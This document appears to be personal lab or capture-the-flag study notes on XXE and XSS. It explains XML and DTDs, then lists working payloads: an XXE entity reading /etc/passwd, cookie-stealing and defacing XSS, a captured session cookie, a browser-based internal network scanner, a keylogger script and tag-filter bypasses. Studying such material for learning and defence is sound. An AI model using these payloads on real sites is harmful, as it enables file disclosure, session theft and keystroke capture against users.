### XXE

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1-  An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2-  out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

### What is XML?

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.

2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.

3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

Syntax

Every XML document mostly starts with what is known as XML Prolog.

<?xml version="1.0" encoding="UTF-8"?>


Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.


Every XML document must contain a `ROOT` element.

Ex:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```


In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`(notice the capitalization of T)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML.

Ex:

`<text category = "message">You need to learn about XXE</text>`


In the above example category is the attribute name and message is the attribute value.


DDT

Let us try to understand this with the help of an example. Say we have a file named note.dtd with the following content:
	
```xml
<!DOCTYPE note [ 
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)> ]>
```
Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses note.dtd
	
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in note.dtd mean
	
```xml
!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ELEMENT from - Defines the from element to be of type "#PCDATA"
!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
!ELEMENT body - Defines the body element to be of type "#PCDATA"
```
	
==NOTE: \#PCDATA means parseable character data.==
    
    
    
## PAYLOAD

Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
	
```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.



extremely easy to do with burpsuite repeater ...




### Stored XSS

as always overthinkink,,, after creating  an account:

`<p>HEY, it's HTML!!</p>`

show our cookie
`<script>alert(document.cookie)</script>`

deface website
`<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>`

show log of cookies
`<img src="javascript:'/log/' + document.cookie" />`

connect.sid s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE

### Reflected XSS

`<script>alert("hello")</script>`

`<script>alert(window.location.hostname)</script>`



### DOM based XSS

`test" onmouseover="alert(document.cookie)" `  

`test" onmouseover="alert(document.body.style.backgroundColor='red')"`


IP and Port Scanning
	
For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

`<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">`

Please keep in mind this is a proof of concept and there are many factors that will effect results such as response times, firewall rules, cross origin policies and more. Our browsers can conduct a basic network scan and infer about existing IP's, hostnames and services. As this is a learning exercise assume the factors do not apply here.

The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255
	
```html
<script>
 for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
 }
</script> 
```


`<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">`
```html
 <script>
 for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
  let ip = '192.168.0.' + i // Creates variable for forming IP
  // Creating an image element, if the resource can load, it logs to the /logs page.
  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code // This is adding the image element to the webpage
 }
</script> 
```


After you've found an valid IP you can then use the same method above and include a port number. However, the method described here only works with web servers (as its looking for the favicon image). A more detailed port scanner can be found here. As previously stated, this page is a proof of concept, you can create scripts which have much more capability.


### Key-Logger with XSS

Javascript can be used for many things, including creating an event to listen for keypresses.
```html
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```




Bypass the filter that removes any script tags.

<img src="blah" onerror=alert("Hello") />


The word alert is filtered, bypass it.

<img src="blah" onerror=confirm("Hello") />

The word hello is filtered.

<img src="blah" onerror=alert("HHelloello") />


Filtered in challenge 4 is as follows:

    word "Hello"
    script
    onerror
    onsubmit
    onload
    onmouseover
    onfocus
    onmouseout
    onkeypress
    onchange

<img src="blah" ONERROR="alert('HHelloello')" />









